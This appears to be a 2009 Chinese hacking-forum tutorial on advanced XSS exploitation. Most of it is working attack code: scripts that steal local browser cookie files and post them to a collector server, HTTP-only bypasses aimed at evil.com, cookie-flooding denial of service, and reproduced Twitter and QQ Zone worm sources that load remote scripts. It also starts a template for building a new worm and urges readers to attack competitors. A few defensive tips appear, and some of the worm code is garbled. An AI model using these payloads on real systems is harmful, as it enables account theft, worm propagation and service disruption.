@@ -1,0 +1,1311 @@
+XSS的高级利用部分总结 -蠕虫,HTTP-only,AJAX本地文件操作,镜象网页
+本帖最后由 racle 于 2009-5-30 09:19 编辑 
+
+XSS的高级利用总结 -蠕虫,HTTPONLY,AJAX本地文件操作,镜象网页
+By racle@tian6.com    
+http://bbs.tian6.com/thread-12711-1-1.html
+转帖请保留版权
+
+
+
+-------------------------------------------前言---------------------------------------------------------
+
+
+本文将撇开XSS语句,JS脚本,如何无错插入XSS语句,如何过滤和绕过XSS语句过滤,CSRF等知识点.也就是说,你必须已经具备一定XSS知识,才能看懂本文.
+
+
+如果你还未具备基础XSS知识,以下几个文章建议拜读:
+http://www.lib.tsinghua.edu.cn/chinese/INTERNET/JavaScript/        JavaScript中文简介
+http://www.google.com/search?q=XSS+%D3%EF%BE%E4        XSS语句大全
+http://www.google.com/search?q=XSS+%C8%C6%B9%FD        XSS语句绕过
+http://www.80vul.com/dzvul/sodb/03/sodb-2008-03.txt        FLASH CSRF
+http://bbs.tian6.com/thread-12239-1-1.html        突破XSS字符数量限制执行任意JS代码
+http://bbs.tian6.com/thread-12241-1-1.html        利用窗口引用漏洞和XSS漏洞实现浏览器劫持
+
+
+
+
+如果本文内容在你眼里显得非常陌生,或者难以理解,或者干燥无味,那正代表你对XSS了解甚少.
+
+希望天阳会员本着技术学习为主的精神,真正的学习和掌握每门安全技术.因此,如果你来天阳是因为你想真正学会一些什么东西的话,请静下心来,看懂,看透,实际测试弄通本文.那么你对XSS的驾驭能力,自然大幅提高.
+
+如果你认为XSS是无足轻重的问题,只不过是常见的一个弹窗,或者你认为XSS作用域狭窄,或者你认为XSS威力微不足道,那么请先看看以下片段:Twitter遭遇疯狂XSS    6次XSS蠕虫版本变化,
+
+Baidu xss蠕虫         感染了8700多个blog.媒体影响力,关注度巨大
+
+QQ ZONE,校内网XSS     感染过万QQ ZONE.
+
+OWASP MYSPACE XSS蠕虫        20小时内传染一百万用户,最后导致MySpace瘫痪
+
+..........
+复制代码------------------------------------------介绍-------------------------------------------------------------
+
+什么是XSS?XSS又叫CSS (Cross Site Script) ,跨站脚本攻击.它指的是恶意攻击者往Web页面里插入恶意html代码,当用户浏览该页之时,嵌入其中Web里面的html代码会被执行,从而达到恶意用户的特殊目的.XSS属于被动式的攻击,因为其被动且不好利用,所以许多人常呼略其危害性.
+
+
+
+跨站攻击有多种方式,由HTML语言允许使用脚本进行简单交互,入侵者便通过技术手段在某个页面里插入一个恶意HTML代码——例如记录论坛保存的用户信息（Cookie）,由于Cookie保存了完整的用户名和密码资料,用户就会遭受安全损失.当然,攻击者有时也会在网页中加入一些以.JS 或.VBS为后尾名的代码时,在我们浏览时,同样我们也会被攻击到.
+
+
+
+如何寻找,如何绕过各种限制,成功无错的执行XSS代码,我们在这里并不讨论.相关的文章在网上也有很多.
+复制代码现今XSS替代了SQL-INJECTION,成为web security课题的首位安全问题.XSS已经成为WEB安全的重要课题.
+我们在这里重点探讨以下几个问题:
+
+1        通过XSS,我们能实现什么?
+
+2        如何通过HTTP-only保护COOKIES. 又如何突破HTTP-only,又如何补救?
+
+3        XSS的高级利用和高级综合型XSS蠕虫的可行性?
+
+4        XSS漏洞在输出和输入两个方面怎么才能避免.
+
+
+
+------------------------------------------研究正题----------------------------------------------------------
+
+
+
+通过XSS,我们能实现什么?通过XSS,我们可以获得用户的COOKIES等信息,模拟用户本身进行HTTP提交,读取客户端本地文件,欺骗社工.结合以上功能,我们还能写出综合高级蠕虫.
+复制代码XSS的高级利用与及综合性XSS高级蠕虫:我们主要讨论XSS在不同的浏览器下的权限限制&&XSS截屏;镜象网页,http only bypass(Cross-Site Tracing XST).写出我们自己的高级XSS蠕虫
+复制代码XSS漏洞在输出和输入两个方面怎么才能避免.
+1:为网站各个动态页面分安全等级,划分重点和次重点区域,分等级采用不同的输入限制规则.
+2:严格控制输入类型,根据实际需求选用数字,字符,特殊格式的限制.
+3:在浏览器端输出时对HTML特殊字符进行了转义,常见采用htmlspecialchars,htmlentities.但是过滤了特殊字符,并不意味就是安全的.很多绕过方法都是争对单纯过滤进行的,譬如URL,8进制,16进制,String.fromCharCode转编码,UBB绕过等.因此应注意每处接受动态输入的代码审计.数据保存在innertxt,标签属性均应处于“”内.
+4:Http-only可以采用作为COOKIES保护方式之一.
+
+
+
+
+
+(I) AJAX在不同的浏览器下的本地文件操作权限:(读取本地的COOKIES,常见的敏感文件如:FTP的INI,etc/shadow,各种第三方应用程序的敏感文件等,并且将内容反馈给攻击者)
+
+我们可以参考空虚浪子心的两篇文章,与及XEYE TEAM的统计信息:    1: ie6可读取无限制本地文件.ie8以及相应版本的trident内核浏览器对ajax本地执行时的权限控制得很死的，看来MS对IE这类安全风险比较重视。(这有一些问题，随后修正!)
+
+
+
+    2: ff 3.0.8及以下版本允许本地执行的ajax访问当前目录下的文件内容。其他目录暂无法访问。
+
+
+
+    3: opera9.64及以下版本允许通过指定url为file://协议进行访问；如果文件在当前目录下，则不需要指定file://协议；如果文件在同一盘符下甚至可以超越目录的方式访问:../../boot.ini。
+
+
+
+    4: 基于webkit内核：google chrome、遨游3.0、safari等浏览器对本地执行的ajax权限没做任何访问限制.
+复制代码IE6使用ajax读取本地文件    <script>
+
+    function $(x){return document.getElementById(x)}
+
+
+
+    function ajax_obj(){
+
+    var request = false;
+
+    if(window.XMLHttpRequest) {
+
+    request = new XMLHttpRequest();
+
+    } else if(window.ActiveXObject) {
+
+    var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0',
+
+
+
+    'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
+
+    for(var i=0; i<versions.length; i++) {
+
+    try {
+
+    request = new ActiveXObject(versions[i]);
+
+    } catch(e) {}
+
+    }
+
+    }
+
+    return request;
+
+    }
+
+    var _x = ajax_obj();
+
+    function _7or3(_m,action,argv){
+
+    _x.open(_m,action,false);
+
+    if(_m=="POST")_x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+
+    _x.send(argv);
+
+    return _x.responseText;
+
+    }
+
+
+
+    var txt=_7or3("GET","file://localhost/C:/11.txt",null);
+
+    alert(txt);
+
+
+
+    </script>
+复制代码FIREFOX 3使用ajax读取本地文件,仅能读取同目录,及其下属目录下文件.    <script>
+
+    function $(x){return document.getElementById(x)}
+
+
+
+    function ajax_obj(){
+
+    var request = false;
+
+    if(window.XMLHttpRequest) {
+
+    request = new XMLHttpRequest();
+
+    } else if(window.ActiveXObject) {
+
+    var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0',
+
+
+
+    'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
+
+    for(var i=0; i<versions.length; i++) {
+
+    try {
+
+    request = new ActiveXObject(versions[i]);
+
+    } catch(e) {}
+
+    }
+
+    }
+
+    return request;
+
+    }
+
+    var _x = ajax_obj();
+
+    function _7or3(_m,action,argv){
+
+    _x.open(_m,action,false);
+
+    if(_m=="POST")_x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+
+    _x.send(argv);
+
+    return _x.responseText;
+
+    }
+
+
+
+    var txt=_7or3("GET","1/11.txt",null);
+
+    alert(txt);
+
+
+
+    </script>
+复制代码Google Chrome使用ajax读取本地文件Chrome的cookie默认保存在"C:\Documents and Settings\administrator\Local Settings\Application Data\Google\Chrome\User Data\Default\Cookies”
+
+
+
+Chrome的历史保存在"C:\Documents and Settings\administrator\Local Settings\Application Data\Google\Chrome\User Data\Default\History"
+
+
+
+<?   
+
+/*  
+
+     Chrome 1.0.154.53 use ajax read local txt file and upload exp  
+
+     www.inbreak.net   
+
+     author voidloafer@gmail.com 2009-4-22    
+
+     http://www.inbreak.net/kxlzxtest/testxss/a.php get cookie and save.  
+
+*/  
+
+header("Content-Disposition: attachment;filename=kxlzx.htm");   
+
+header("Content-type: application/kxlzx");   
+
+/*  
+
+     set header, so just download html file,and open it at local.  
+
+*/  
+
+?>   
+
+<form id="form" action="http://www.inbreak.net/kxlzxtest/testxss/a.php" method="POST">   
+
+     <input id="input" name="cookie" value="" type="hidden">   
+
+</form>   
+
+<script>   
+
+function doMyAjax(user)   
+
+{   
+
+var time = Math.random();   
+
+/*  
+
+the cookie at C:\Documents and Settings\kxlzx\Local Settings\Application Data\Google\Chrome\User Data\Default  
+
+and the history at C:\Documents and Settings\kxlzx\Local Settings\Application Data\Google\Chrome\User Data\History  
+
+and so on...  
+
+*/  
+
+var strPer = 'file://localhost/C:/Documents and Settings/'+user+'/Local Settings/Application Data/Google/Chrome/User Data/Default/Cookies?time='+time;   
+
+    
+
+startRequest(strPer);   
+
+
+
+}   
+
+   
+
+function Enshellcode(txt)   
+
+{   
+
+var url=new String(txt);   
+
+var i=0,l=0,k=0,curl="";   
+
+l= url.length;   
+
+for(;i<l;i++){   
+
+k=url.charCodeAt(i);   
+
+if(k<16)curl+="0"+k.toString(16);else curl+=k.toString(16);}   
+
+if (l%2){curl+="00";}else{curl+="0000";}   
+
+curl=curl.replace(/(..)(..)/g,"%u$2$1");   
+
+return curl;   
+
+}   
+
+   
+
+   
+
+var xmlHttp;   
+
+function createXMLHttp(){   
+
+     if(window.XMLHttpRequest){   
+
+xmlHttp = new XMLHttpRequest();           
+
+     }   
+
+     else if(window.ActiveXObject){   
+
+xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");   
+
+     }   
+
+}   
+
+   
+
+function startRequest(doUrl){   
+
+    
+
+     createXMLHttp();   
+
+
+
+     xmlHttp.onreadystatechange = handleStateChange;   
+
+
+
+     xmlHttp.open("GET", doUrl, true);   
+
+
+
+     xmlHttp.send(null);   
+
+
+
+
+
+}    
+
+   
+
+function handleStateChange(){   
+
+     if (xmlHttp.readyState == 4 ){   
+
+     var strResponse = "";   
+
+     setTimeout("framekxlzxPost(xmlHttp.responseText)", 3000);    
+
+        
+
+     }   
+
+}   
+
+   
+
+   
+
+function framekxlzxPost(text)   
+
+{   
+
+     document.getElementById("input").value = Enshellcode(text);   
+
+     document.getElementById("form").submit();   
+
+}   
+
+   
+
+doMyAjax("administrator");   
+
+   
+
+</script>
+复制代码opera 9.52使用ajax读取本地COOKIES文件<script>  
+
+var xmlHttp;  
+
+function createXMLHttp(){  
+
+     if(window.XMLHttpRequest){  
+
+         xmlHttp = new XMLHttpRequest();          
+
+     }  
+
+     else if(window.ActiveXObject){  
+
+         xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");  
+
+     }  
+
+}  
+
+   
+
+function startRequest(doUrl){  
+
+           
+
+     createXMLHttp();  
+
+       
+
+     xmlHttp.onreadystatechange = handleStateChange;  
+
+       
+
+     xmlHttp.open("GET", doUrl, true);  
+
+       
+
+     xmlHttp.send(null);  
+
+       
+
+       
+
+}   
+
+   
+
+function handleStateChange(){  
+
+     if (xmlHttp.readyState == 4 ){  
+
+             var strResponse = "";  
+
+             setTimeout("framekxlzxPost(xmlHttp.responseText)", 1000);   
+
+               
+
+     }  
+
+}  
+
+   
+
+function doMyAjax(user,file)  
+
+{  
+
+         var time = Math.random();  
+
+           
+
+         var strPer = 'file://localhost/C:/Documents%20and%20Settings/'+user+'/Cookies/'+file+'?time='+time;  
+
+           
+
+         startRequest(strPer);  
+
+       
+
+}  
+
+   
+
+function framekxlzxPost(text)  
+
+{  
+
+     document.getElementById('framekxlzx').src="http://www.inbreak.net/kxlzxtest/testxss/a.php?cookie="+escape(text);  
+
+     alert(/ok/);  
+
+}  
+
+   
+
+doMyAjax('administrator','administrator@alibaba[1].txt');  
+
+   
+
+</script>
+
+
+
+
+
+a.php
+
+
+
+<?php      
+
+   
+
+$user_IP = ($_SERVER["HTTP_VIA"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["REMOTE_ADDR"];  
+
+$user_IP = ($user_IP) ? $user_IP : $_SERVER["REMOTE_ADDR"];   
+
+  
+
+$fp = fopen($user_IP.date("Y-m-d H:i:s")."cookie.txt","wb");     
+
+fwrite($fp,$_GET["cookie"]);      
+
+fclose($fp);    
+
+?> 
+复制代码(II) XSS截屏-镜象网页与XSS实现DDOS:
+
+或许你对你女朋友的校内网里的好友列表感兴趣,又或者你对你的客户部竞争对手的电话通信记录感兴趣,那么这个由XEYE TEAM提出的新想法,对你就有用.
+利用XSS获得指定的受控者授权状态下的页面源代码,再传发到目标页面,处理好相对路径,那么攻击者就能截取任意一个受控端的授权状态下的镜象网页.达到类似远程控制程序截屏的功能.
+
+代码片段://xmlHttpReq.open("GET","AWebSiteWhichYouNeedToCatch.com",false);
+
+//xmlHttpReq.open("GET","http://friend.xiaonei.com/myfriendlistx.do",false);
+
+//xmlHttpReq.open("GET","http://chinatelecom.com/mylistofnopermonth.jsp?no=139xxxxxxxx",false);
+
+function getURL(s) {
+
+var image = new Image();
+
+image.style.width = 0;
+
+image.style.height = 0;
+
+image.src = s;
+
+}
+
+getURL("http://urwebsite.com/get.php?pagescopies="+xmlHttpReq.responseText);
+复制代码XSS也能大材小用DDOS? 利用XSS操作COOKIES,导致HEADER部分过大,引发IIS或APACHE等服务端CRASH或者拒绝响应.生效时长与COOKIES允许保存时间相等.
+这里引用大风的一段简单代码:<script language="javascript">
+
+var metastr = "AAAAAAAAAA"; // 10 A
+
+var str = "";
+
+while (str.length < 4000){
+
+    str += metastr;
+
+}
+
+
+
+document.cookie = "evil3=" + "\<script\>alert(xss)\<\/script\>" +";expires=Thu, 18-Apr-2019 08:37:43 GMT;";    // 一些老版本的webserver可能在这里还会存在XSS
+
+</script>
+
+详细代码请看:http://hi.baidu.com/aullik5/blog/item/6947261e7eaeaac0a7866913.html
+复制代码如果你觉得XSS用来DDOS太可惜的话,这里也提供另外一篇文章供你参考,随与XSS无关,但是却也挺有意思.
+server limit ddos利用随想 - 空虚浪子心 http://www.inbreak.net/?action=show&id=150
+
+假设msn.com出现了问题,被XSS了.并且攻击者把COOKIES 设置成yahoo.com的.那么所有访问msn.com的用户将无法访问yahoo.com.
+攻击者在自己的网站上iframe了server limit ddos,目标设置为竞争对手myass.com,那么所有访问过攻击者网站的人,将无法访问其同行竞争对手myass.com的网站,这样不很妙么?呵呵.
+
+
+
+
+
+
+(III) Http only bypass 与 补救对策:
+
+什么是HTTP-ONLY?HTTP-ONLY为Cookie提供了一个新属性，用以阻止客户端脚本访问Cookie.
+以下是测试采用HTTPONLY与不采用时,遭受XSS时,COOKIES的保护差别。<script type="text/javascript">
+
+<!--
+
+function normalCookie() { 
+
+document.cookie = "TheCookieName=CookieValue_httpOnly"; 
+
+alert(document.cookie);
+
+}
+
+
+
+
+
+function httpOnlyCookie() { 
+
+document.cookie = "TheCookieName=CookieValue_httpOnly; httpOnly"; 
+
+alert(document.cookie);}
+
+
+
+//-->
+
+</script>
+
+
+
+<FORM><INPUT TYPE=BUTTON OnClick="normalCookie();" VALUE='Display Normal Cookie'>
+
+<INPUT TYPE=BUTTON OnClick="httpOnlyCookie();" VALUE='Display HTTPONLY Cookie'></FORM>
+复制代码但是采用HTPPONLY就安全了吗?不一定.采用TRACE获得HEADER里的COOKIES:<script>
+
+
+
+var request = false;
+
+        if(window.XMLHttpRequest) {
+
+            request = new XMLHttpRequest();
+
+            if(request.overrideMimeType) {
+
+                request.overrideMimeType('text/xml');
+
+            }
+
+        } else if(window.ActiveXObject) {
+
+            var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
+
+            for(var i=0; i<versions.length; i++) {
+
+                try {
+
+                    request = new ActiveXObject(versions[i]);
+
+                } catch(e) {}
+
+            }
+
+        }
+
+xmlHttp=request;
+
+xmlHttp.open("TRACE","http://www.vul.com",false);
+
+xmlHttp.send(null);
+
+xmlDoc=xmlHttp.responseText;
+
+alert(xmlDoc);
+
+</script>
+复制代码但是许多网站并不支持TRACE调试命令,那么我们还可以通过访问phpinfo();页面,筛选带有COOKIE的字段值.<script>
+
+var XmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
+
+XmlHttp.open("GET","http://www.google.com",false);
+
+XmlHttp.setRequestHeader("Host","www.evil.com/collet.php");
+
+XmlHttp.send(null);
+
+var resource=xmlHttp.responseText
+
+resource.search(/cookies/);
+
+......................
+
+</script>
+
+
+
+
+
+如何防止对方采用TRACE访问你的网站?APACHE可以采用.htaccess来Rewrite TRACE请求
+
+[code]
+
+RewriteEngine On
+
+RewriteCond %{REQUEST_METHOD} ^TRACE
+
+RewriteRule .* - [F]
+
+
+
+Squid可以添加以下信息到Squid configuration file (squid.conf),屏蔽TRACE请求
+
+acl TRACE method TRACE
+
+...
+
+http_access deny TRACE
+复制代码突破还可以采用XmlHttp.setRequestHeader.通过setRequestHeader,把COOKIES等信息转向到目标页面.<script>
+
+var XmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
+
+XmlHttp.open("GET","http://www.google.com",false);
+
+XmlHttp.setRequestHeader("Host","www.evil.com/collet.php");
+
+XmlHttp.send(null);
+
+</script>
+复制代码当Apache启动了mod_proxy,还可以使用proxy方式作为中间人方式获得受保护COOKIES.<script>
+
+var XmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
+
+
+
+XmlHttp.open("GET\thttp://www.evil.com/collet.php","http://www.vul.site/wherever",false);
+
+XmlHttp.send(null);
+
+<script>
+复制代码(IV) 综合性的高级XSS蠕虫:什么是XSS蠕虫,他的实现,传染,工作原理,常见作用都是什么.
+复制代码案例:Twitter 蠕蟲五度發威
+第一版:
+  下载 (5.1 KB)
+
+6 天前 08:27
+
+第二版:   1. var _0xc26a = ["Msxml2.XMLHTTP", "Microsoft.XMLHTTP", "connect", "toUpperCase", "GET", "?", "open", "", "Method", "POST ", " HTTP/1.1", "setRequestHeader", "Content-Type", "application/x-www-form-urlencoded", "onreadystatechange", "readyState", "send", "split", "join", "'", "%27", "(", "%28", ")", "%29", "*", "%2A", "~", "%7E", "!", "%21", "%20", "+", "%", "replace", "innerHTML", "documentElement", "exec", "Twitter should really fix this... Mikeyy", "I am done... Mikeyy", "Mikeyy is done..", "Twitter please fix this, regards Mikeyy", "random", "length", "floor", "mikeyy:) "></a><script>document.write(unescape(/%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%63%6f%6e%74%65%6e%74%2e%69%72%65%65%6c%2e%63%6f%6d%2f%6a%73%78%73%73%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e/.source));</script> <a ", "mikeyy:) "></a><script>document.write(unescape(/%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%63%6f%6e%74%65%6e%74%2e%69%72%65%65%6c%2e%63%6f%6d%2f%78%73%73%6a%73%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e/.source));</script> <a ", "mikeyy:) "></a><script>document.write(unescape(/%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%62%61%6d%62%61%6d%79%6f%2e%31%31%30%6d%62%2e%63%6f%6d%2f%77%6f%6d%70%77%6f%6d%70%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e/.source));</script> <a ", "/status/update", "POST", "authenticity_token=", "&status=", "&return_rendered_status=true&twttr=true", "/account/settings", "&user[name]=Womp+++++++++++++++++++++++++++++++++++++++++!&user[url]=", "&tab=home&update=update", "/account/profile_settings", "&user[profile_default]=false&tab=none&profile_theme=0&user[profile_use_background_image]=0&user[profile_background_tile]=0&user[profile_link_color]=", "&commit=save+changes", "wait()""];  
+
+   2.    
+
+   3. function XHConn(){  
+
+   4.   var _0x6687x2,_0x6687x3=false;  
+
+   5.   try{ _0x6687x2= new ActiveXObject(_0xc26a[0x0]); }  
+
+   6.   catch(e) { try{ _0x6687x2= new ActiveXObject(_0xc26a[0x1]); }  
+
+   7.   catch(e) { try { _0x6687x2= new XMLHttpRequest(); }  
+
+   8.   catch(e) { _0x6687x2=false; }; }; };  
+复制代码第六版:   1. function wait() {  
+
+   2.   var content = document.documentElement.innerHTML;  
+
+   3.   var tmp_cookie=document.cookie;  
+
+   4.   var tmp_posted=tmp_cookie.match(/posted/);  
+
+   5.   authreg= new RegExp(/twttr.form_authenticity_token = '(.*)';/g);  
+
+   6.   var authtoken=authreg.exec(content);  
+
+   7.   var authtoken=authtoken[1];  
+
+   8.   var randomUpdate= new Array();  
+
+   9.   randomUpdate[0]= "Be nice to your kids. They'll choose your nursing home. Womp. mikeyy.";  
+
+  10.   randomUpdate[1]= "If you are born ugly blame your parents, if you died ugly blame your doctor. Womp. mikeyy.";  
+
+  11.   randomUpdate[2]= "Every man should marry. After all, happiness is not the only thing in life. Womp. mikeyy.";  
+
+  12.   randomUpdate[3]= "Age is a very high price to pay for maturity. Womp. mikeyy.";  
+
+  13.   randomUpdate[4]= "Ninety-nine percent of all lawyers give the rest a bad name. Womp. mikeyy.";  
+
+  14.   randomUpdate[5]= "If your father is a poor man, it is your fate, but if your father-in-law is a poor man, it's your stupidity. Womp. mikeyy.";  
+
+  15.   randomUpdate[6]= "Money is not the only thing, it's everything. Womp. mikeyy.";  
+
+  16.   randomUpdate[7]= "Success is a relative term. It brings so many relatives. Womp. mikeyy.";  
+
+  17.   randomUpdate[8]= "'Your future depends on your dreams', So go to sleep. Womp. mikeyy.";  
+
+  18.   randomUpdate[9]= "God made relatives; Thank God we can choose our friends.Womp. mikeyy.";  
+
+  19.   randomUpdate[10]= "'Work fascinates me' I can look at it for hours ! Womp. mikeyy.";  
+
+  20.   randomUpdate[11]= "I have enough money to last me the rest of my life. (unless I buy something) Womp. mikeyy.";  
+
+  21.   randomUpdate[12]= "RT!! @spam Watch out for the Mikeyy worm http://bit.ly/XvuJe";  
+
+  22.   randomUpdate[13]= "FUCK. NEW MIKEYYY WORM! REMOVE IT: http://bit.ly/fuSkF";  
+
+  23.   randomUpdate[14]= "Mikeyy worm is back!!! Click here to remove it: http://bit.ly/UTPXe";  
+
+  24.     
+
+  25.   var genRand = randomUpdate[Math.floor(Math.random()*randomUpdate.length)];  
+
+  26.   var updateEncode=urlencode(randomUpdate[genRand]);  
+
+  27.     
+
+  28.   var ajaxConn= new XHConn();  
+
+  29.   ajaxConn.connect("/status/update","POST","authenticity_token="+authtoken+_"&status="+updateEncode+"&return_rendered_status=true&twttr=true");  
+
+  30.   var _0xf81bx1c="Mikeyy";  
+
+  31.   var updateEncode=urlencode(_0xf81bx1c);  
+
+  32.   var ajaxConn1= new XHConn();  
+
+  33.   ajaxConn1.connect("/account/settings","POST","authenticity_token="]+authtoken+"&user[name]="+updateEncode+""+updateEncode+"&user[description]="+updateEncode+"&user[location]="+updateEncode+"&user[protected]=0&commit=Save");  
+
+  34.   var genXSS="000; }  #notifications{width: expression(document.body.appendChild(document.createElement('script')).src='http://runebash.net/xss.js');) #test { color:#333333";  
+
+  35.   var XSS=urlencode(genXSS);  
+
+  36.   var ajaxConn2= new XHConn();  
+
+  37.   ajaxConn2.connect("/account/profile_settings",""POST,"authenticity_token="]+authtoken+"&user[profile_sidebar_fill_color]="+XSS+"&commit=save+changes");  
+
+  38.     
+
+  39. } ;  
+
+  40. setTimeout(wait(),5250);  
+复制代码QQ空间XSSfunction killErrors() {return true;}
+
+window.onerror=killErrors;
+
+
+
+var shendu;shendu=4;
+
+//---------------global---v------------------------------------------
+
+//通过indexOf函数得到URL中相应的字符串，用于判断是否登录的吧？
+
+var visitorID;var userurl;var guest;var xhr;var targetblogurlid="0";
+
+var myblogurl=new Array();var myblogid=new Array();
+
+        var gurl=document.location.href;
+
+        var gurle=gurl.indexOf("com/");
+
+        gurl=gurl.substring(0,gurle+3);        
+
+        var visitorID=top.document.documentElement.outerHTML;
+
+           var cookieS=visitorID.indexOf("g_iLoginUin = ");
+
+        visitorID=visitorID.substring(cookieS+14);
+
+        cookieS=visitorID.indexOf(",");
+
+        visitorID=visitorID.substring(0,cookieS);
+
+        get_my_blog(visitorID);
+
+        DOshuamy();
+
+
+
+//挂马
+
+function DOshuamy(){
+
+var ssr=document.getElementById("veryTitle");
+
+ssr.insertAdjacentHTML("beforeend","<iframe width=0 height=0 src='http://www.xxx.com/1.html'></iframe>");
+
+}
+
+
+
+//如果创建XMLHttpRequest成功就跳到指定的URL去，这个URL是干什么的就不知道了，没看过，刷人气？
+
+function get_my_blog(visitorID){
+
+   userurl=gurl+"/cgi-bin/blognew/blog_output_toppage?uin="+visitorID+"&direct=1";
+
+   xhr=createXMLHttpRequest();    //创建XMLHttpRequest对象
+
+   if(xhr){    //成功就执行下面的
+
+     xhr.open("GET",userurl,false);    //以GET方式打开定义的URL
+
+     xhr.send();guest=xhr.responseText;
+
+     get_my_blogurl(guest);    //执行这个函数
+
+    }
+
+}
+
+
+
+//这里似乎是判断没有登录的
+
+function get_my_blogurl(guest){
+
+  var mybloglist=guest;
+
+  var myurls;var blogids;var blogide;
+
+  for(i=0;i<shendu;i++){
+
+     myurls=mybloglist.indexOf('selectBlog(');    //查找URL中"selectBlog"字符串，干什么的就不知道了
+
+     if(myurls!=-1){    //找到了就执行下面的
+
+         mybloglist=mybloglist.substring(myurls+11);
+
+         myurls=mybloglist.indexOf(')');
+
+         myblogid[i]=mybloglist.substring(0,myurls);
+
+        }else{break;}
+
+}
+
+get_my_testself();    //执行这个函数
+
+}
+
+
+
+//这里往哪跳就不知道了
+
+function get_my_testself(){
+
+  for(i=0;i<myblogid.length;i++){    //获得blogid的值
+
+      var url=gurl+"/cgi-bin/blognew/blog_output_data?uin="+visitorID+"&blogid="+myblogid[i]+"&r="+Math.random();
+
+      var xhr2=createXMLHttpRequest();    //创建XMLHttpRequest对象
+
+      if(xhr2){        //如果成功
+
+              xhr2.open("GET",url,false);     //打开上面的那个url
+
+              xhr2.send();
+
+              guest2=xhr2.responseText;
+
+              var mycheckit=guest2.indexOf("baidu");    //找"baidu"这个字符串，找它做什么？
+
+              var mycheckmydoit=guest2.indexOf("mydoit"); //找"mydoit"这个字符串
+
+              if(mycheckmydoit!="-1"){    //返回-1则代表没找到
+
+                targetblogurlid=myblogid[i];    
+
+                add_jsdel(visitorID,targetblogurlid,gurl);    //执行它
+
+                break;
+
+               }
+
+              if(mycheckit=="-1"){
+
+                targetblogurlid=myblogid[i];
+
+                add_js(visitorID,targetblogurlid,gurl);    //执行它
+
+                break;
+
+               }
+
+        }      
+
+}
+
+}
+
+
+
+//--------------------------------------  
+
+//根据浏览器创建一个XMLHttpRequest对象
+
+function createXMLHttpRequest(){
+
+    var XMLhttpObject=null;  
+
+    if (window.XMLHttpRequest) {XMLhttpObject = new XMLHttpRequest()}  
+
+    else  
+
+      { var MSXML=['Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP','MSXML.XMLHTTP', 'MICROSOFT.XMLHTTP.1.0','MICROSOFT.XMLHTTP.1', 'Microsoft.XMLHTTP'];        
+
+        for(var i=0;i<MSXML.length;i++)  
+
+        {  
+
+            try  
+
+            {  
+
+                XMLhttpObject=new ActiveXObject(MSXML[i]);  
+
+                break;  
+
+            }  
+
+            catch (ex) {  
+
+            }  
+
+         }  
+
+      }
+
+return XMLhttpObject;
+
+}  
+
+
+
+//这里就是感染部分了
+
+function add_js(visitorID,targetblogurlid,gurl){
+
+var s2=document.createElement('script');
+
+s2.src='http://xss0211.111.5ghezu.com.cn/images/qq/temp/wm/linshi/index.php?gurl='+gurl+'&uin='+visitorID+'&blogid='+targetblogurlid+"&r="+Math.random();
+
+s2.type='text/javascript';
+
+document.getElementsByTagName('head').item(0).appendChild(s2);
+
+}
+
+
+
+function add_jsdel(visitorID,targetblogurlid,gurl){
+
+var s2=document.createElement('script');
+
+s2.src='http://xss0211.111.5ghezu.com.cn/images/qq/temp/wm/linshi/del.php?gurl='+gurl+'&uin='+visitorID+'&blogid='+targetblogurlid+"&r="+Math.random();
+
+s2.type='text/javascript';
+
+document.getElementsByTagName('head').item(0).appendChild(s2);
+
+}
+复制代码通过以上几个蠕虫,我们可以总结蠕虫的工作原理为:
+1:首先写入调用蠕虫代码到一个存在XSS漏洞的位置(在非长久性XSS漏洞里,我们也可以通过把短暂性的XSS连接通过各种传播方式,发送给其他用户,当某个用户中了XSS后,再通过蠕虫,向其好友发送同一短暂性XSS连接.)
+
+2:受害用户在登陆状态中,观看了存在XSS的问题页面,JS执行,并植入XSS蠕虫代码到该用户帐户中,且通过搜索好友等方法,传播给其他用户.即复制感染过程.(在论坛或者回复类型页面中传播XSS蠕虫,只要保证每页面同时存在2个或者以上蠕虫,就可以保证蠕虫不会被增加的数据覆盖.)
+
+综上所述,结合以上种种技巧,就可以创造我们自己的XSS蠕虫了.在我们的蠕虫里,我们可以添加截取屏幕功能,DDOS功能,可以判断客户端浏览器的版本,读取并且发送客户端的本地文件~
+
+
+下面,我们来初步写一个简单主体蠕虫,并且预留可添加功能的地方.
+
+首先,自然是判断不同浏览器,创建不同的对象var request = false;
+
+if(window.XMLHttpRequest) {
+
+request = new XMLHttpRequest();
+
+if(request.overrideMimeType) {
+
+request.overrideMimeType('text/xml');
+
+}
+
+} else if(window.ActiveXObject) {
+
